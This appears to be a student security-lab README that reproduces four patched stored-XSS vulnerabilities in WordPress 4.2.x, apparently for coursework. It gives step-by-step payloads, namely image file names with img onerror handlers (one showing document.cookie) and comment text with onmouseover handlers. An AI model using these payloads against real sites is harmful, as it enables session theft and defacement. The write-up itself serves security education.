# Project-WordPress-vs.-Kali
Hacking wordpress

# WordPress 2.5-4.6 - Authenticated Stored Cross-Site Scripting via Image Filename

Summary: Used an XSS attack by renaming an image which includes ```<img src=a onerror=alert(document.cookie)>``` in its name. Upon viewing the image, onerror will trigger.

Vulnerability type: XSS
WordPress version tested in: 4.2.0
Fixed in version 4.2.1

GIF Walkthrough: https://imgur.com/a/3VgGqGIF Walkthrough: 

Steps to recreate: 
- Downloaded an image from online and renamed it: ```cengizhansahinsumofpwn<img src=a onerror=alert(document.cookie)>.jpg```
- On WordPress, upload the newly named image and post it
- On Media tab, click on the image you just uploaded and click on "view attachment page"

Source: https://sumofpwn.nl/advisory/2016/persistent_cross_site_scripting_vulnerability_in_wordpress_due_to_unsafe_processing_of_file_names.html

# WordPress <= 4.2 - Unauthenticated Stored Cross-Site Scripting (XSS)

Summary: Implementing an XSS attack with a long text. The text will be truncated when inserted into database that will malformed HTML generated on the page which is an vulnerability for XSS attacks

Vulnerability type: XSS
WordPress version tested in: 4.2.0
Fixed in version 4.2.1

GIF Walkthrough: https://imgur.com/a/t0LrQ

Steps to recreate: 
- Type ```"<a title='x onmouseover=alert(unescape(/hello%20world/.source)) style=position:absolute;left:0;top:0;width:5000px;height:5000px  AAAAAAAAAAAA...[64 kb]..AAA'></a>"``` into the comment section on WordPress. The message needs to be at least 64 kb, so you will need to copy paste many 'A's until the message is large enough before submitting.

Source:https://klikki.fi/adv/wordpress2.html

# WordPress 3.3-4.7.4 - Large File Upload Error XSS

Summary: Implementing XSS attack by uploading a png filename called "```Dinosaurs secret life<img src=x onerror=alert(1)>.png```". The png is over 20 MB, which will be too large to be accepted. An error will appear when the png is being uploaded due to exceeding size limit, which will also trigger the onerror alert.

Vulnerability type: XSS
WordPress version tested in: 4.2.0
Fixed in version 4.2.15

GIF Walkthrough: https://imgur.com/a/ZmR35

Steps to recreate: 
- Find a large file over 20mb
- Rename the file to "```Dinosaurs secret life<img src=x onerror=alert(1)>.png```"
- Upload the file as a new media post to prompt the onerror alert

Source: https://hackerone.com/reports/203515

# WordPress <= 4.2.3 - Legacy Theme Preview Cross-Site Scripting (XSS)

Summary: Implementing a onmouseover XSS attack by typing: ```"<a href='/wp-admin/' title="" style="position:absolute;top:0;left:0;width:100%;height:100%;display:block;" onmouseover=alert(1)//'>Test</a>"``` on the comment section of WordPress.

Vulnerability type: XSS
WordPress version tested in: 4.2.0
Fixed in version 4.2.4

GIF Walkthrough: https://imgur.com/a/cFywj

Steps to recreate: 
- Copy the text: ```<a href='/wp-admin/' title="" style="position:absolute;top:0;left:0;width:100%;height:100%;display:block;" onmouseover=alert(1)//'>Test</a>```
- Paste the text on the comment section of WordPress.

Source: https://blog.sucuri.net/2015/08/persistent-xss-vulnerability-in-wordpress-explained.html


